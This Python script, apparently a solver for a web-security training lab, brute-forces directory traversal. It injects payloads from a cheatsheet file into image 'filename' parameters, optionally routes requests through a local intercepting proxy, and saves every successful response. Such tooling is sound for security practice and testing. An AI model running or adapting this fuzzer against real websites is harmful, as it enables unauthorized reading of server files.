import requests
from bs4 import BeautifulSoup
from app.url_PARSER import SET_QUERY, get_domain
from colorama import Fore, Style, init

# Initialize colorama for cross-platform support
init()

# Proxy settings
proxy_settings = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080"
}

# Define styles
GREEN = Fore.GREEN
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT

# Function to show request and response details
def SHOW_DETAILS(v, response, request):
    print(f"Request URL: {request.url}")
    print(f"Request Headers: {request.headers}")
    print(f"Response Status Code: {response.status_code}")
    print(f"Response Headers: {response.headers}")
    print(f"Response Content: {response.text[:100]}")  # Limit output for readability

def DIRECTORY_BRUTEFORCE(proxies=False, cert_path='', file='directory-traversal-cheatsheet.txt',
                         url="https://0ad4003e042a345a806a3fb60056007c.web-security-academy.net/product?productId=1",
                         ALL=False,SAVE_PATH = None):

    # Make an initial request through the proxy
    try:
        if proxies:
            print("Using proxy for the request.")
            response = requests.get(url, proxies=proxy_settings, verify=cert_path[0], timeout=10)
        else:
            response = requests.get(url, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"Initial request failed: {e}")
        return

    soup = BeautifulSoup(response.text, 'html.parser')
    img_tags_list = [i for i in soup.find_all('img') if "filename" in i['src']]
    domain = get_domain(url)

    for img in img_tags_list:
        img_url = img['src']
        with open(file, 'r', encoding="utf-8") as g:
            QUERY_list = g.readlines()

        for query in QUERY_list:
            img_url = SET_QUERY(query, img_url).replace("%0A", "")
            new_url = domain + img_url

            try:
                if proxies:
                    img_response = requests.get(new_url, proxies=proxy_settings, verify=cert_path[0], timeout=10)
                else:
                    img_response = requests.get(new_url, timeout=10)

                if img_response.status_code == 200:
                    print(f"{BOLD}{GREEN}✔ Found valid response for: {RESET}{new_url}")
                    if SAVE_PATH :
                        with open( SAVE_PATH +f"result_{query.replace('/', '').replace('\n', '')}.txt", 'wb') as f:
                            f.write(img_response.content)
                    else :
                        with open(f"result_{query.replace('/', '').replace('\n', '')}.txt", 'wb') as f:
                            f.write(img_response.content)
                    if not ALL:
                        break
            except requests.exceptions.RequestException as e:
                print(f"Error while accessing {new_url}: {e}")
